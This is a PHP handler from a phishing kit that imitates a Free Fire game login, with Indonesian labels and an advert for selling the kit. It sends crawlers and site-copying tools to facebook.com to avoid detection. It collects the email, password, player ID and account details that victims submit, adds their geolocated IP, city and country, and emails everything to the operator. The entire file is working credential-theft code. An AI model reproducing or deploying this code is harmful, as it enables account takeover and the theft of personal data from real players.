<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/');
die();
}

include 'system/setting.php';
include 'system/location.php';
include 'email.php';

$email = $_POST['email'];
$password = $_POST['password'];
$id = $_POST['playerID'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$ep = $_POST['ep'];
$login = $_POST['login'];

$country  = $khcodes['country'];
$region   = $khcodes['regionName'];
$city     = $khcodes['city'];
$ipAddr   = $khcodes['query'];

$setRyusCalling = $ryuCalling['country_code'];

if($email == "" && $password == "" && $nickname == "" && $id == "" && $level == "" && $tier == "" && $login == ""){
	header("Location: index.php");
} else {
	$file_lines = file('system/checkLogin.txt');
	foreach ($file_lines as $file => $value) {
		$data = explode("|", $value);
		if (in_array($email, $data)) {
			session_start();
			$_SESSION['nickname'] = $nickname;
			header('location: success.php');
		} else {
			$myfile = fopen("system/checkLogin.txt", "a") or die("Unable to open file!");
			$txt = $email;
			if(fwrite($myfile, "|". $txt)) {
				$subjek = "$resultFlags | FREE FIRE | LEVEL $level | ID $id";
				$pesan = <<<EOD
					<!DOCTYPE html>
					<html>
					<head>
						<title></title>
						<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
						<style type="text/css">
							body {
								font-family: "Helvetica";
								width: 90%;
								display: block;
								margin: auto;
								border: 1px solid #fff;
								background: #fff;
							}

							.result {
								width: 100%;
								height: 100%;
								display: block;
								margin: auto;
								position: fixed;
								top: 0;
								right: 0;
								left: 0;
								bottom: 0;
								z-index: 999;
								overflow-y: scroll;
							}

							.tblResult {
								width: 100%;
								display: table;
								margin: 0px auto;
								border-collapse: collapse;
								text-align: center;
								background: rgba(247,129,129, 0.1);
							}

							.tblResult th {
								text-align: left;
								font-size: 0.75em;
								margin: auto;
								padding: 15px 10px;
								background: #F8E0EC;
								border: 2px solid #F8E0EC;
								color: #0B0B0B;
							}

							.tblResult td {
								font-size: 0.75em;
								margin: auto;
								padding: 10px;
								border: 2px solid #F8E0EC;
								text-align: left;
								font-weight: bold;
								color: #0B0B0B;
								text-shadow: 0px 0px 10px #fff;

							}

							.tblResult th img {
								width: 45px;
								display: block;
								margin: auto;
								border-radius: 50%;
								box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
							}
						</style>
					</head>
					<body>
						<div class="result">
							<table class="tblResult">
								<tr>
									<th style="text-align: center;" colspan="3">Informasi Akun Free Fire</th>
								</tr>
								<tr>
									<td style="border-right: none;">Email Akun</td>
									<td style="text-align: right;">$email</td>
								</tr>
								<tr>
									<td style="border-right: none;">Password Akun</td>
									<td style="text-align: right;">$password</td>
								</tr>
								<tr>
									<th style="text-align: center;" colspan="3">Detail Akun Free Fire</th>
								</tr>
								<tr>
									<td style="border-right: none;">ID Player</td>
									<td style="text-align: right;">$id</td>
								</tr>
								<tr>
									<td style="border-right: none;">Level Akun</td>
									<td style="text-align: right;">Level $level</td>
								</tr>
								<tr>
									<td style="border-right: none;">Tier</td>
									<td style="text-align: right;">$tier</td>
                                                                </tr>              
								<tr>
									<td style="border-right: none;">Login Via</td>
									<td style="text-align: right;">$login</td>
								</tr>
								<tr>
									<th style="text-align: center;" colspan="3">ORDER WEB P ? CHET WA 083899929919</th>
								</tr>
								<tr>
									<td style="border-right: none;">Country</td>
									<td style="text-align: right;">$country</td>
								</tr>
								<tr>
									<td style="border-right: none;">Region</td>
									<td style="text-align: right;">$region</td>
								</tr>
								<tr>
									<td style="border-right: none;">City</td>
									<td style="text-align: right;">$city</td>
								</tr>
								<tr>
									<td style="border-right: none;">IP Address</td>
									<td style="text-align: right;">$ipAddr</td>
								</tr>
								<tr>
									<th style="text-align: center;" colspan="3">2022 &copy; Free Fire</th>
								</tr>
							</table>
						</div>
					</body>
					</html>
EOD;
				$headers  = 'MIME-Version: 1.0' . "\r\n";
				$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
				$headers .= ''.$sender.'' . "\r\n";
				$kirim = mail($emailku, $subjek, $pesan, $headers);
               
				if($kirim) {
					session_start();
					$_SESSION['accId'] = $id;
					header('location: success.php');
				}
			}
		}
	}
}
?>